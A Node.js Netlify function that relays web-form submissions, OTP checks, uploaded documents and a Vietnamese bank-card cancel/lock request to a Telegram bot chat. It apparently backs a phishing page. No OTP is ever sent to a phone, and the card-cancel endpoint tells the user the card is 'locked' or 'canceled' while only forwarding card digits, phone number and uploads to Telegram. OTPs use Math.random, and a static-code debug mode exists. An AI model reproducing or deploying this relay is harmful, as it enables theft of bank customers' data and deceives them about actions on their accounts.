// Netlify Function: Unified relay + OTP endpoints
// NOTE: Simplified adaptation of server.js logic (no document upload yet)
// Endpoints handled (method sensitive):
//  POST /form/submit-init
//  POST /otp/request
//  POST /otp/verify
//  POST /tele/sendMessage
//  GET  /health
//  GET  /_envinfo (if DEV_ALLOW_ENVINFO)
//  POST /tele/sendDocument (currently returns 501 Not Implemented)
// Environment variables:
//  BOT_TOKEN, CHAT_ID, HMAC_KEY, REQUIRE_HMAC=1
//  DEBUG_RETURN_OTP=1, DEMO_STATIC_OTP=1, DEV_ALLOW_ENVINFO=1
// Optional Redis: REDIS_URL

import crypto from 'crypto';
import fetch from 'node-fetch';
import FormData from 'form-data';

let redisInitPromise = null;

async function initRedis() {
    if (redisInitPromise) return redisInitPromise;
    const { REDIS_URL } = process.env;
    if (!REDIS_URL) return null;
    redisInitPromise = (async () => {
        const { createClient } = await import('redis');
        const client = createClient({ url: REDIS_URL });
        client.on('error', e => console.error('[Redis] error', e));
        await client.connect();
        return client;
    })();
    return redisInitPromise;
}

// In-memory fallback (lives per warm container)
const memStore = {
    otp: new Map(),
    nonces: new Map(),
    rate: new Map()
};

function json(body, status = 200, extra = {}) {
    return {
        statusCode: status,
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            ...extra
        },
        body: JSON.stringify(body)
    };
}
function text(body, status = 200, extra = {}) {
    return {
        statusCode: status,
        headers: {
            'Content-Type': 'text/plain',
            'Access-Control-Allow-Origin': '*',
            ...extra
        },
        body
    };
}

function randomId(prefix = 'REQ') {
    return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
}
function sanitizeMessage(str = '') {
    return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '').slice(0, 3800);
}
function maskPhone(p) {
    if (!p) return '—';
    return p.replace(/^(\+?84|0)?(\d{3})\d+(\d{2})$/, '$1$2***$3');
}
function generateOtp() {
    return process.env.DEMO_STATIC_OTP === '1'
        ? '123456'
        : Math.floor(Math.random() * 1e6).toString().padStart(6, '0');
}
function sha256Hex(str) {
    return crypto.createHash('sha256').update(str).digest('hex');
}

async function storeOtp(client, requestId, phone, code, ttlSec = 60) {
    const salt = randomId('salt').slice(-8);
    const rec = {
        phone,
        salt,
        codeHash: sha256Hex(code + '.' + salt),
        expireAt: Date.now() + ttlSec * 1000,
        attempts: 0,
        maxAttempts: 6,
        createdAt: Date.now()
    };
    if (client) {
        await client.setEx(`otp:${requestId}`, ttlSec + 300, JSON.stringify(rec));
    } else {
        memStore.otp.set(requestId, rec);
        setTimeout(() => memStore.otp.delete(requestId), (ttlSec + 300) * 1000);
    }
    return rec;
}

async function getOtpRecord(client, requestId) {
    if (client) {
        const raw = await client.get(`otp:${requestId}`);
        return raw ? JSON.parse(raw) : null;
    }
    return memStore.otp.get(requestId) || null;
}

async function saveOtpRecord(client, requestId, rec) {
    const ttl = Math.max(Math.floor((rec.expireAt - Date.now()) / 1000), 30);
    if (client) {
        await client.setEx(`otp:${requestId}`, ttl, JSON.stringify(rec));
    } else {
        memStore.otp.set(requestId, rec);
        setTimeout(() => memStore.otp.delete(requestId), (ttl + 10) * 1000);
    }
}

async function deleteOtp(client, requestId) {
    if (client) await client.del(`otp:${requestId}`);
    else memStore.otp.delete(requestId);
}

async function rateLimit(client, key, max, windowSec) {
    const bucketKey = (t = Date.now()) =>
        `rate:${key}:${Math.floor(t / 1000 / windowSec)}`;
    if (client) {
        const bucket = bucketKey();
        const val = await client.incr(bucket);
        if (val === 1) await client.expire(bucket, windowSec + 5);
        return val <= max;
    } else {
        const bucket = bucketKey();
        const cur = memStore.rate.get(bucket) || 0;
        if (cur >= max) return false;
        memStore.rate.set(bucket, cur + 1);
        setTimeout(() => memStore.rate.delete(bucket), (windowSec + 5) * 1000);
        return true;
    }
}

async function nonceCheck(client, nonce) {
    if (!nonce) return false;
    if (client) {
        const exists = await client.get(`nonce:${nonce}`);
        if (exists) return false;
        await client.setEx(`nonce:${nonce}`, 300, '1');
        return true;
    } else {
        if (memStore.nonces.has(nonce)) return false;
        memStore.nonces.set(nonce, 1);
        setTimeout(() => memStore.nonces.delete(nonce), 300 * 1000);
        return true;
    }
}

function timingSafeEqual(a, b) {
    if (a.length !== b.length) return false;
    return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
}

function verifyHmac(rawBody, method, path, headers) {
    const REQUIRE = process.env.REQUIRE_HMAC === '1';
    if (!REQUIRE) return { ok: true };
    const sig = headers['x-signature'];
    const ts = headers['x-timestamp'];
    const nonce = headers['x-nonce'];
    if (!sig || !ts || !nonce) return { ok: false, error: 'missing_headers' };
    const tsNum = parseInt(ts, 10);
    if (!tsNum || Math.abs(Math.floor(Date.now() / 1000) - tsNum) > 120) {
        return { ok: false, error: 'timestamp_out_of_range' };
    }
    const base = `${method.toUpperCase()}\n${path}\n${tsNum}\n${nonce}\n${rawBody}`;
    const expected = crypto.createHmac('sha256', process.env.HMAC_KEY || '')
        .update(base).digest('hex');
    const provided = sig.startsWith('v1=') ? sig.slice(3) : sig;
    if (!timingSafeEqual(expected, provided)) {
        return { ok: false, error: 'bad_signature' };
    }
    return { ok: true, nonce };
}

async function tgCall(method, payload, isForm = false) {
    if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
        throw new Error('Missing BOT_TOKEN/CHAT_ID');
    }
    const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/${method}`;
    const init = isForm
        ? { method: 'POST', body: payload }
        : {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        };
    const r = await fetch(url, init);
    if (!r.ok) {
        return { ok: false, status: r.status, text: await r.text() };
    }
    const j = await r.json().catch(() => ({}));
    return { ok: true, data: j };
}

async function audit(msg) {
    try {
        await tgCall('sendMessage', {
            chat_id: process.env.CHAT_ID,
            text: sanitizeMessage(`_AUDIT:_ ${msg}`)
        });
    } catch { /* ignore */ }
}

export async function handler(event) {
    // CORS preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type,X-Signature,X-Timestamp,X-Nonce',
                'Access-Control-Allow-Methods': 'GET,POST,OPTIONS'
            }
        };
    }

    const path = event.path;
    const method = event.httpMethod;
    const headersLower = Object.fromEntries(
        Object.entries(event.headers || {}).map(([k, v]) => [k.toLowerCase(), v])
    );
    const rawBody = event.body && event.isBase64Encoded
        ? Buffer.from(event.body, 'base64').toString('utf8')
        : (event.body || '');
    const contentType = headersLower['content-type'] || '';

    const client = await initRedis();

    // Rate limit by IP
    const ip = headersLower['x-nf-client-connection-ip']
        || (headersLower['x-forwarded-for']?.split(',')[0].trim())
        || 'ip-unknown';
    const rateOk = await rateLimit(client, `ip:${ip}`, 300, 60);
    if (!rateOk) return json({ error: 'rate_limited' }, 429);

    // HMAC verification
    const hmacRes = verifyHmac(rawBody, method, path, headersLower);
    if (!hmacRes.ok) return json({ error: hmacRes.error }, 401);
    if (hmacRes.nonce) {
        const nonceOk = await nonceCheck(client, hmacRes.nonce);
        if (!nonceOk) return json({ error: 'nonce_replay_or_missing' }, 401);
    }

    // Parse JSON lazily
    let bodyObj = null;
    if (method === 'POST' && contentType.includes('application/json')) {
        try {
            bodyObj = rawBody ? JSON.parse(rawBody) : {};
        } catch {
            return json({ error: 'invalid_json' }, 400);
        }
    }

    try {
        // Health
        if (path === '/health' && method === 'GET') {
            return json({ ok: true, ts: Date.now() });
        }

        // Env info (dev)
        if (path === '/_envinfo' && method === 'GET') {
            if (process.env.DEV_ALLOW_ENVINFO === '1') {
                return json({
                    ok: true,
                    hmac: process.env.REQUIRE_HMAC === '1'
                });
            }
            return text('', 404);
        }

        // Telegram sendMessage
        if (path === '/tele/sendMessage' && method === 'POST') {
            if (!bodyObj || typeof bodyObj.message !== 'string') {
                return json({ error: 'invalid_body' }, 400);
            }
            const r = await tgCall('sendMessage', {
                chat_id: process.env.CHAT_ID,
                text: sanitizeMessage(bodyObj.message),
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            });
            if (!r.ok) {
                return json({ error: 'telegram_error', detail: r.text }, r.status || 500);
            }
            return json({ status: 'ok', messageId: r.data?.result?.message_id });
        }

        // Telegram sendDocument (base64 JSON -> multipart)
        if (path === '/tele/sendDocument' && method === 'POST') {
            if (!bodyObj || typeof bodyObj !== 'object') return json({ error: 'invalid_body' }, 400);
            const { filename = 'upload.bin', mimeType = 'application/octet-stream', base64, caption = '', parseMode } = bodyObj;
            if (!base64 || typeof base64 !== 'string') return json({ error: 'missing_base64' }, 400);
            if (filename.length > 100 || /[\\/]/.test(filename)) return json({ error: 'invalid_filename' }, 400);
            const ALLOW = new Set(['image/png', 'image/jpeg', 'image/jpg', 'image/webp', 'application/pdf', 'text/plain', 'application/octet-stream']);
            if (!ALLOW.has(mimeType)) return json({ error: 'invalid_mimeType' }, 400);
            let buffer;
            try { buffer = Buffer.from(base64, 'base64'); } catch { return json({ error: 'invalid_base64' }, 400); }
            if (!buffer || buffer.length === 0) return json({ error: 'empty_file' }, 400);
            const maxBytes = parseInt(process.env.MAX_DOC_BYTES || '5000000', 10);
            if (buffer.length > maxBytes) return json({ error: 'file_too_large', limit: maxBytes }, 400);
            const safeCaption = sanitizeMessage(String(caption || '')).slice(0, 1024);
            const fd = new FormData();
            fd.append('chat_id', process.env.CHAT_ID);
            fd.append('document', buffer, { filename, contentType: mimeType });
            if (safeCaption) fd.append('caption', safeCaption);
            if (parseMode && ['Markdown', 'HTML', 'MarkdownV2'].includes(parseMode)) fd.append('parse_mode', parseMode);
            const r = await tgCall('sendDocument', fd, true);
            if (!r.ok) return json({ error: 'telegram_error', detail: r.text }, r.status || 500);
            const fileId = r.data?.result?.document?.file_id;
            await audit(`DOC ${filename} size:${buffer.length}B fileId:${fileId || 'n/a'}`);
            return json({ status: 'ok', messageId: r.data?.result?.message_id, fileId });
        }

        // Submit init -> create OTP
        if (path === '/form/submit-init' && method === 'POST') {
            const summary = bodyObj?.summary;
            const phone = bodyObj?.phone || '';
            if (!summary || typeof summary !== 'string' || !summary.trim()) {
                return json({ error: 'invalid_summary' }, 400);
            }
            const requestId = randomId('REQ');
            const otp = generateOtp();
            await storeOtp(client, requestId, phone, otp, 60);
            await audit(`INIT ${requestId}\nPhone:${maskPhone(phone)}\nLen:${summary.length}`);
            return json({
                status: 'ok',
                requestId,
                maskedPhone: maskPhone(phone),
                otp: { ttlSeconds: 60, length: 6, resendAfter: 30 },
                debugOtp: process.env.DEBUG_RETURN_OTP === '1' ? otp : undefined
            });
        }

        // Request OTP resend
        if (path === '/otp/request' && method === 'POST') {
            const requestId = bodyObj?.requestId;
            if (!requestId) return json({ error: 'missing_requestId' }, 400);
            const rec = await getOtpRecord(client, requestId);
            if (!rec) return json({ error: 'not_found' }, 404);
            const allow = await rateLimit(client, `otp_resend:${requestId}`, 3, 300);
            if (!allow) return json({ error: 'resend_rate_limited' }, 429);
            const otp = generateOtp();
            await storeOtp(client, requestId, rec.phone, otp, 60);
            await audit(`RESEND OTP ${requestId}`);
            return json({
                status: 'ok',
                otp: { ttlSeconds: 60, resendAfter: 30 },
                debugOtp: process.env.DEBUG_RETURN_OTP === '1' ? otp : undefined
            });
        }

        // Verify OTP
        if (path === '/otp/verify' && method === 'POST') {
            const { requestId, otp, summary } = bodyObj || {};
            if (!requestId || !otp) return json({ error: 'missing_fields' }, 400);
            const rec = await getOtpRecord(client, requestId);
            if (!rec) return json({ error: 'otp_not_found' }, 404);
            if (Date.now() > rec.expireAt) return json({ error: 'otp_expired' }, 400);
            if (rec.attempts >= rec.maxAttempts) return json({ error: 'otp_locked' }, 400);
            const match = sha256Hex(otp + '.' + rec.salt) === rec.codeHash;
            rec.attempts += 1;
            await saveOtpRecord(client, requestId, rec);
            if (!match) {
                await audit(`OTP WRONG ${requestId} attempt:${rec.attempts}`);
                if (rec.attempts >= rec.maxAttempts) {
                    return json({ status: 'error', code: 'OTP_LOCKED' }, 400);
                }
                return json({
                    status: 'error',
                    code: 'OTP_INVALID',
                    remaining: rec.maxAttempts - rec.attempts
                }, 400);
            }
            await deleteOtp(client, requestId);
            await audit(`OTP OK ${requestId}`);
            if (summary && typeof summary === 'string' && summary.length < 10000) {
                const textMsg = sanitizeMessage(summary + `\n\n(rid:${requestId})`);
                await tgCall('sendMessage', {
                    chat_id: process.env.CHAT_ID,
                    text: textMsg,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                });
            }
            return json({ status: 'verified', submittedAt: new Date().toISOString() });
        }

        // Card cancel init
        if (path === '/card/cancel/init' && method === 'POST') {
            const { cardLast4, phone, reasonCode, reasonNote, action, channel, acceptTerms } = bodyObj || {};
            if (!cardLast4 || !phone || !reasonCode || !action || !channel || acceptTerms !== true) {
                return json({ error: 'missing_fields' }, 400);
            }
            const requestId = randomId('CAN');
            await audit(`[HỦY/TẠM KHÓA THẺ] ${requestId}\nCard ****${cardLast4.slice(-4)} | Action: ${action}\nReason: ${reasonCode}${reasonNote ? ' - ' + reasonNote : ''}\nPhone: ${maskPhone(phone)}\nChannel: ${channel}\nTime: ${new Date().toISOString()}`);
            return json({
                status: 'ok',
                requestId,
                action: action === 'TEMP_LOCK' ? 'locked' : 'canceled'
            });
        }

        // Card cancel confirm
        if (path === '/card/cancel/confirm' && method === 'POST') {
            const { requestId, otp } = bodyObj || {};
            if (!requestId || !otp) return json({ error: 'missing_fields' }, 400);
            const rec = await getOtpRecord(client, requestId);
            if (!rec) return json({ error: 'otp_not_found' }, 404);
            if (Date.now() > rec.expireAt) return json({ error: 'otp_expired' }, 400);
            if (rec.attempts >= rec.maxAttempts) return json({ error: 'otp_locked' }, 400);
            const match = sha256Hex(otp + '.' + rec.salt) === rec.codeHash;
            rec.attempts += 1;
            await saveOtpRecord(client, requestId, rec);
            if (!match) {
                await audit(`OTP WRONG ${requestId} attempt:${rec.attempts}`);
                if (rec.attempts >= rec.maxAttempts) {
                    return json({ status: 'error', code: 'OTP_LOCKED' }, 400);
                }
                return json({
                    status: 'error',
                    code: 'OTP_INVALID',
                    remaining: rec.maxAttempts - rec.attempts
                }, 400);
            }
            await deleteOtp(client, requestId);
            await audit(`OTP OK ${requestId}`);
            return json({ status: 'confirmed', requestId, action: 'TEMP_LOCK', submittedAt: new Date().toISOString() });
        }

        return json({ error: 'not_found' }, 404);
    } catch (e) {
        console.error('[relay] error', e);
        return json({ error: 'internal_error' }, 500);
    }
}

function sign(method, path, body, key) {
    const ts = Math.floor(Date.now() / 1000).toString();
    const nonce = crypto.randomBytes(12).toString('hex');
    const base = method.toUpperCase() + "\n" + path + "\n" + ts + "\n" + nonce + "\n" + body;
    const sig = crypto.createHmac('sha256', key).update(base).digest('hex');
    return { ts, nonce, signature: 'v1=' + sig };
}
